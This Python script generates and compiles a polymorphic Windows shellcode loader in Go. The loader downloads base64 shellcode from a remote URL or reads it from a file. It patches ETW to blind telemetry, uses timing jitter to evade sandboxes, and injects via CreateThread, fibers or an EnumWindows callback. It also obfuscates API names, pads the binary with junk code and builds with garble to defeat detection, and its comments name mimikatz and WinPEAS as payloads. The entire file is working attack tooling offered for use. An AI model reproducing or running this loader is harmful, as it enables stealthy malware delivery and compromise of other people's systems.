#!/usr/bin/env python3
"""
Polymorphic Go Shellcode Runner Generator v2
Generates a unique runner.go on each invocation with:
- Randomized variable/function names
- String obfuscation for API names (multi-split)
- Multiple injection methods (CreateThread, EnumWindows callback, CreateFiber)
- ETW patching to blind telemetry
- Sandbox timing check with variable duration
- Junk code padding with realistic-looking functions
- Random jitter
- Garble compilation for binary-level obfuscation
"""

import random
import string
import subprocess
import sys
import os

def rand_name(min_len=6, max_len=12):
    """Generate a random Go-valid identifier."""
    first = random.choice(string.ascii_lowercase)
    rest = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(min_len, max_len)))
    return first + rest

def obfuscate_string(s):
    """Convert a string to Go byte slice construction with random split."""
    bytes_list = list(s.encode())
    # Randomly XOR with a key and add runtime decode
    return f'string([]byte{{{",".join(str(b) for b in bytes_list)}}})'

def multi_split_api(name):
    """Split API name into 2-4 random fragments concatenated at runtime."""
    parts = []
    remaining = name
    num_splits = random.randint(1, 3)
    for i in range(num_splits):
        if len(remaining) <= 2:
            break
        mid = random.randint(1, len(remaining) - 1)
        parts.append(remaining[:mid])
        remaining = remaining[mid:]
    parts.append(remaining)
    return ' + '.join(obfuscate_string(p) for p in parts)

def gen_junk_func():
    """Generate a junk function that looks like legitimate code."""
    name = rand_name()
    templates = [
        # Math operation
        f'func {name}() int {{\n\tx := 0\n\tfor i := 0; i < {random.randint(10,100)}; i++ {{\n\t\tx += i * {random.randint(2,9)}\n\t}}\n\treturn x\n}}',
        # String builder
        f'func {name}() string {{\n\tb := make([]byte, {random.randint(8,32)})\n\tfor i := range b {{\n\t\tb[i] = byte({random.randint(65,90)} + (i % {random.randint(2,10)}))\n\t}}\n\treturn string(b)\n}}',
        # Bool check
        f'func {name}() bool {{\n\treturn {random.randint(1,1000)} > {random.randint(1,500)}\n}}',
        # Slice operation
        f'func {name}() []int {{\n\ts := make([]int, {random.randint(5,20)})\n\tfor i := range s {{\n\t\ts[i] = i * {random.randint(2,7)} + {random.randint(1,100)}\n\t}}\n\treturn s\n}}',
        # Map operation
        f'func {name}() map[string]int {{\n\tm := make(map[string]int)\n\tfor i := 0; i < {random.randint(3,8)}; i++ {{\n\t\tk := fmt.Sprintf("k%d", i)\n\t\tm[k] = i * {random.randint(2,5)}\n\t}}\n\treturn m\n}}',
        # Channel operation
        f'func {name}() int {{\n\tch := make(chan int, 1)\n\tch <- {random.randint(1,999)}\n\treturn <-ch\n}}',
    ]
    return random.choice(templates)

def generate(output_path="runner.go", injection="create_thread"):
    # Polymorphic runner - multiple injection techniques:
    # create_thread: VirtualAlloc RW→RX + RtlMoveMemory + CreateThread (32MB stack)
    # fiber:         VirtualAlloc RW→RX + RtlMoveMemory + ConvertThreadToFiber + CreateFiber + SwitchToFiber
    # enum_windows:  VirtualAlloc RW→RX + RtlMoveMemory + EnumWindows callback
    #
    # IMPORTANT: fiber/enum_windows fall back to 1MB CreateThread which crashes
    # large payloads (WinPEAS, mimikatz). Use create_thread for reliable execution.

    if injection not in ("create_thread", "fiber", "enum_windows"):
        injection = "create_thread"

    # Randomized identifiers
    v = {k: rand_name() for k in [
        'getDLL', 'checkErr', 'fetchPayload', 'readPayload',
        'decode', 'run', 'localPath', 'remoteURL',
        'encodedSC', 'decodedSC', 'mainDecoded',
        'httpClient', 'resp',
        'memAddr', 'memSize', 'oldProt', 'threadH',
        'procVA', 'procCT', 'procWF', 'procMC',
        'kDLL', 'nDLL', 'patchETW', 'etwProc',
        'fiberMain', 'fiberSC', 'procCTF', 'procCF', 'procSTF',
        'procEW', 'jitter', 'sleepMs',
    ]}

    # Obfuscated DLL names via byte slice construction
    kernel32 = obfuscate_string("kernel32.dll")
    ntdll = obfuscate_string("ntdll.dll")
    user32 = obfuscate_string("user32.dll")

    # API names split into random fragments concatenated at runtime
    va_name = multi_split_api("VirtualAlloc")
    vp_name = multi_split_api("VirtualProtect")
    mc_name = multi_split_api("RtlMoveMemory")
    ct_name = multi_split_api("CreateThread")
    wf_name = multi_split_api("WaitForSingleObject")
    etw_name = multi_split_api("EtwEventWrite")
    ctf_name = multi_split_api("ConvertThreadToFiber")
    cf_name  = multi_split_api("CreateFiber")
    stf_name = multi_split_api("SwitchToFiber")
    ew_name  = multi_split_api("EnumWindows")

    # Random junk functions (look like real code to static analysis)
    junk_funcs = '\n\n'.join(gen_junk_func() for _ in range(random.randint(3, 6)))

    # Build injection block based on chosen technique
    if injection == "fiber":
        injection_block = f"""\t// Fiber injection — no new thread creation
\t{v['fiberMain']}, _, _ := {v['kDLL']}.NewProc({ctf_name}).Call(0)
\tif {v['fiberMain']} == 0 {{
\t\t// fallback: CreateThread with 32MB stack (STACK_SIZE_PARAM_IS_A_RESERVATION)
\t\t{v['threadH']}, _, _ := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
\t\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)
\t\treturn
\t}}
\t{v['fiberSC']}, _, _ := {v['kDLL']}.NewProc({cf_name}).Call(33554432, {v['memAddr']}, 0)
\tif {v['fiberSC']} == 0 {{
\t\t// CreateFiber failed — fallback: CreateThread with 32MB stack
\t\t{v['threadH']}, _, _ := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
\t\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)
\t\treturn
\t}}
\t{v['kDLL']}.NewProc({stf_name}).Call({v['fiberSC']})"""
    elif injection == "enum_windows":
        injection_block = f"""\t// EnumWindows callback injection — user32.dll, no explicit thread
\t{v['procEW']}.Call({v['memAddr']}, 0)"""
    else:  # create_thread
        injection_block = f"""\t// CreateThread with 32MB stack + WaitForSingleObject
\t{v['threadH']}, _, err := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
\tif {v['threadH']} == 0 {{
\t\t{v['checkErr']}(err, "CreateThread failed")
\t}}
\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)"""

    extra_import = '\t"math/rand"' if True else ''

    # Only declare user32/procEW var when using enum_windows injection
    user32_var = f'\t{v["procEW"]} = windows.NewLazySystemDLL({user32}).NewProc({ew_name})' if injection == "enum_windows" else ""

    code = f'''package main

import (
\t"encoding/base64"
\t"flag"
\t"fmt"
\t"io"
\t"math/rand"
\t"net/http"
\t"os"
\t"time"
\t"unsafe"

\t"golang.org/x/sys/windows"
)

var (
\t{v['kDLL']} = windows.NewLazySystemDLL({kernel32})
\t{v['nDLL']} = windows.NewLazySystemDLL({ntdll})
{user32_var}
\tproc{v['procMC']} = {v['nDLL']}.NewProc({mc_name})
)

{junk_funcs}

func {v['checkErr']}(err error, msg string) {{
\tif err != nil {{
\t\tfmt.Fprintf(os.Stderr, "[!] %s: %v\\n", msg, err)
\t\tos.Exit(1)
\t}}
}}

func {v['patchETW']}() {{
\t{v['etwProc']} := {v['nDLL']}.NewProc({etw_name})
\t{v['etwProc']}.Find()
\tpatch := []byte{{0xC3}}
\tvar {v['oldProt']} uint32
\tvp := {v['kDLL']}.NewProc({vp_name})
\tvp.Call({v['etwProc']}.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&{v['oldProt']})))
\t*(*byte)(unsafe.Pointer({v['etwProc']}.Addr())) = patch[0]
\tvp.Call({v['etwProc']}.Addr(), 1, uintptr({v['oldProt']}), uintptr(unsafe.Pointer(&{v['oldProt']})))
}}

func {v['fetchPayload']}(url string) []byte {{
\t{v['httpClient']} := &http.Client{{}}
\t{v['resp']}, err := {v['httpClient']}.Get(url)
\t{v['checkErr']}(err, "download failed")
\tdefer {v['resp']}.Body.Close()
\tdata, err := io.ReadAll({v['resp']}.Body)
\t{v['checkErr']}(err, "read failed")
\treturn data
}}

func {v['readPayload']}(p string) []byte {{
\tdata, err := os.ReadFile(p)
\t{v['checkErr']}(err, "load failed")
\treturn data
}}

func {v['decode']}(data []byte) []byte {{
\tdecoded, err := base64.StdEncoding.DecodeString(string(data))
\t{v['checkErr']}(err, "decode failed")
\treturn decoded
}}

func {v['run']}({v['decodedSC']} []byte) {{
\t{v['patchETW']}()

\t// Timing jitter — sandbox evasion
\t{v['sleepMs']} := time.Duration(rand.Intn(800)+200) * time.Millisecond
\ttime.Sleep({v['sleepMs']})

\t// VirtualAlloc PAGE_READWRITE (no RWX signature)
\t{v['memAddr']}, err := windows.VirtualAlloc(
\t\t0,
\t\tuintptr(len({v['decodedSC']})),
\t\twindows.MEM_COMMIT|windows.MEM_RESERVE,
\t\twindows.PAGE_READWRITE,
\t)
\t{v['checkErr']}(err, "VirtualAlloc failed")

\t// Copy shellcode into RW region
\tproc{v['procMC']}.Call(
\t\t{v['memAddr']},
\t\tuintptr(unsafe.Pointer(&{v['decodedSC']}[0])),
\t\tuintptr(len({v['decodedSC']})),
\t)

\t// Flip to RX (execute, no write) — avoids RWX detection
\tvar {v['oldProt']} uint32
\tvp := {v['kDLL']}.NewProc({vp_name})
\tvp.Call({v['memAddr']}, uintptr(len({v['decodedSC']})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{v['oldProt']})))

{injection_block}
}}

func main() {{
\t{v['localPath']} := flag.String("local", "", "Path to local base64-encoded shellcode file")
\t{v['remoteURL']} := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
\tflag.Parse()

\tvar {v['encodedSC']} []byte

\tif *{v['localPath']} != "" {{
\t\t{v['encodedSC']} = {v['readPayload']}(*{v['localPath']})
\t}} else if *{v['remoteURL']} != "" {{
\t\t{v['encodedSC']} = {v['fetchPayload']}(*{v['remoteURL']})
\t}} else {{
\t\tfmt.Println("[!] Usage: -local <path> | -remote <url>")
\t\tos.Exit(1)
\t}}

\t{v['mainDecoded']} := {v['decode']}({v['encodedSC']})
\tfmt.Println("[+] Shellcode decoded. Executing...")
\t{v['run']}({v['mainDecoded']})
}}
'''

    with open(output_path, 'w') as f:
        f.write(code)

    print(f"[+] Generated polymorphic runner: {output_path} (injection: {injection})")
    return output_path


def find_go(script_dir=None):
    """Find Go binary, preferring our installed version over system/asdf."""
    search = []
    if script_dir:
        search.append(os.path.join(script_dir, 'go', 'bin', 'go'))
    search.extend([
        '/opt/my-resources/bin/go/bin/go',
        '/opt/killshot/go/bin/go',
        '/usr/local/go/bin/go',
    ])
    for p in search:
        if os.path.isfile(p):
            return p
    # Fallback to PATH
    return 'go'


def find_garble(script_dir=None):
    """Find garble binary."""
    search = []
    if script_dir:
        search.append(os.path.join(script_dir, 'go', 'bin', 'garble'))
    search.extend([
        os.path.expanduser('~/go/bin/garble'),
        '/opt/killshot/go/bin/garble',
    ])
    for p in search:
        if os.path.isfile(p):
            return p
    return None


def compile(source_path, output_path="runner.exe", mod_dir=None, use_garble=True, script_dir=None):
    """Cross-compile the generated Go source for Windows."""
    # Find our Go binary and set GOROOT explicitly to avoid asdf/version conflicts
    go_bin = find_go(script_dir)
    go_root = None
    if go_bin != 'go':
        # GOROOT is two levels up from the go binary (go/bin/go -> go/)
        go_root = os.path.dirname(os.path.dirname(go_bin))

    env = os.environ.copy()
    env['GOOS'] = 'windows'
    env['GOARCH'] = 'amd64'
    env['CGO_ENABLED'] = '0'
    env['GOPROXY'] = 'https://proxy.golang.org,direct'
    env['GONOSUMCHECK'] = '*'
    env['GONOSUMDB'] = '*'

    # Pin GOROOT to prevent stale cache / asdf version mismatch
    if go_root:
        env['GOROOT'] = go_root

    # Ensure our Go is first in PATH (ahead of asdf shims)
    if go_bin != 'go':
        go_bin_dir = os.path.dirname(go_bin)
        env['PATH'] = go_bin_dir + ':' + env.get('PATH', '')

    # Clean stale build cache on version mismatch
    try:
        r = subprocess.run([go_bin, 'version'], capture_output=True, text=True, timeout=5, env=env)
        go_ver = r.stdout.strip() if r.returncode == 0 else ''
        print(f"[*] Go: {go_ver}")
    except Exception:
        pass

    # Remove existing binary
    abs_output = os.path.abspath(output_path)
    if os.path.exists(abs_output):
        os.remove(abs_output)

    # Try garble first for binary obfuscation
    compiler = go_bin
    garble_bin = None
    if use_garble:
        garble_bin = find_garble(script_dir)
        if garble_bin:
            try:
                r = subprocess.run([garble_bin, 'version'], capture_output=True, timeout=5, env=env)
                if r.returncode == 0:
                    compiler = garble_bin
            except (FileNotFoundError, subprocess.TimeoutExpired):
                garble_bin = None

    if compiler != go_bin:
        print(f"[*] Using garble for binary obfuscation")
        cmd = [compiler, '-literals', '-tiny', '-seed=random', 'build',
               '-ldflags=-s -w', '-trimpath', '-o', abs_output, '.']
    else:
        print(f"[*] Using standard go build (garble not available)")
        cmd = [go_bin, 'build', '-ldflags=-s -w', '-trimpath', '-o', abs_output, '.']

    cwd = mod_dir if mod_dir else os.path.dirname(source_path) or '.'

    try:
        result = subprocess.run(
            cmd, env=env, capture_output=True, text=True, cwd=cwd
        )
        if result.returncode != 0:
            if compiler != go_bin:
                print(f"[!] Garble failed, falling back to standard build: {result.stderr[:200]}")
                cmd = [go_bin, 'build', '-ldflags=-s -w', '-trimpath', '-o', abs_output, '.']
                result = subprocess.run(cmd, env=env, capture_output=True, text=True, cwd=cwd)
                if result.returncode != 0:
                    # Try cleaning cache if version mismatch
                    if 'does not match go tool version' in result.stderr:
                        print(f"[*] Version mismatch detected, cleaning build cache...")
                        subprocess.run([go_bin, 'clean', '-cache'], env=env, capture_output=True, timeout=30)
                        result = subprocess.run(cmd, env=env, capture_output=True, text=True, cwd=cwd)
                    if result.returncode != 0:
                        print(f"[!] Compile error: {result.stderr}")
                        return False
            else:
                # Try cleaning cache if version mismatch
                if 'does not match go tool version' in result.stderr:
                    print(f"[*] Version mismatch detected, cleaning build cache...")
                    subprocess.run([go_bin, 'clean', '-cache'], env=env, capture_output=True, timeout=30)
                    result = subprocess.run(cmd, env=env, capture_output=True, text=True, cwd=cwd)
                if result.returncode != 0:
                    print(f"[!] Compile error: {result.stderr}")
                    return False
        size = os.path.getsize(abs_output)
        print(f"[+] Compiled: {output_path} ({size} bytes)")
        return True
    except Exception as e:
        print(f"[!] Compile failed: {e}")
        return False


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Polymorphic Runner Generator v2')
    parser.add_argument('-o', '--output', default='runner.exe', help='Output exe path')
    parser.add_argument('-s', '--source-dir', default='.', help='Directory with go.mod')
    parser.add_argument('--source-only', action='store_true', help='Only generate source, skip compile')
    parser.add_argument('--no-garble', action='store_true', help='Skip garble, use standard go build')
    parser.add_argument('--injection', default='create_thread', choices=['create_thread', 'fiber', 'enum_windows'], help='Injection technique (create_thread recommended for large payloads)')
    args = parser.parse_args()

    src = os.path.join(args.source_dir, 'runner.go')
    generate(src, injection=args.injection)

    if not args.source_only:
        compile(src, args.output, mod_dir=args.source_dir, use_garble=not args.no_garble, script_dir=args.source_dir)
